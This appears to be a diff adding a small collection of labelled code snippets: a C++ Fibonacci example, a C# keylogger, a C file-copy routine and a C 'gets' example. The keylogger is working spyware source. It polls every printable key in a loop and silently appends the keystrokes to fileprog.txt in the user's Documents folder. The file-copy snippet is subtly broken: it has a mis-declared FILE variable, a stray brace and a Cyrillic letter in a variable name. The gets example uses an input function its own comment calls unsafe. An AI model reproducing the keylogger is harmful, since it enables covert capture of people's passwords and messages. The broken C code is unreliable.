@@ -1,0 +1,109 @@
+Fibonaci nums
+C++
+/* cosh example */
+#include <iostream>
+#include "MathLibrary.h"
+int main()
+{
+	fibonacci_init(1, 1);
+
+	do {
+		std::cout << fibonacci_index() << ": "
+			<< fibonacci_current() << std::endl;
+	} while (fibonacci_next());
+	
+	std::cout << fibonacci_index() + 1 <<
+		" Fibonacci sequence values fit in an " <<
+		"unsigned 64-bit integer." << std::endl;
+}
+$$
+Key logger
+C#
+class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+       // static string kelLog = "";
+
+        static void Main(string[] args)
+        {
+            String file = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+            if (!Directory.Exists(file))
+            {
+                Directory.CreateDirectory(file);
+            }
+
+            String path = (file + @"\fileprog.txt");
+
+            if (!File.Exists(path))
+            {
+                using (StreamWriter sw = File.CreateText(path))
+                {
+                   
+                }
+            }
+            Console.Clear();
+            while (true)
+            {
+                Thread.Sleep(120);
+
+                for (int i = 32; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+                    if (keyState !=0) 
+                    {
+                        Console.Write((char) i + ";");
+                        using (StreamWriter sw = File.AppendText(path))
+                        {
+                            sw.Write((char) i);
+                        }
+                    }
+                }
+            }
+        }
+    }
+$$
+Filework
+C
+/* fprintf example */
+#include <stdio.h>
+int main(int argc, char *argv[])
+{
+FILE *in, out;
+char ch;
+if (argc!=3) {
+printf("You forgot to enter a filename.");
+return 1;
+}
+if( (in=fopen(argv[1] , "rb")) == NULL)}
+printf ("Cannot open source file.");
+return 1;
+}
+if((out=fopen(argv[ 2 ] , "wb")) == NULL) {
+printf ("Cannot open destination file.");
+return 1;
+}
+while (!feof (in)) {
+сh = getc(in);
+if ( !feof(in)) putc(ch, out);
+}
+fclose(in);
+fclose(out);
+return 0;
+}
+$$
+function gets
+C
+/* gets example */
+#include <stdio.h>
+
+int main()
+{
+  char string [256];
+  printf ("Insert your full address: ");
+  gets (string);     // warning: unsafe (see fgets instead)
+  printf ("Your address is: %s\n",string);
+  return 0;
+}
+$$
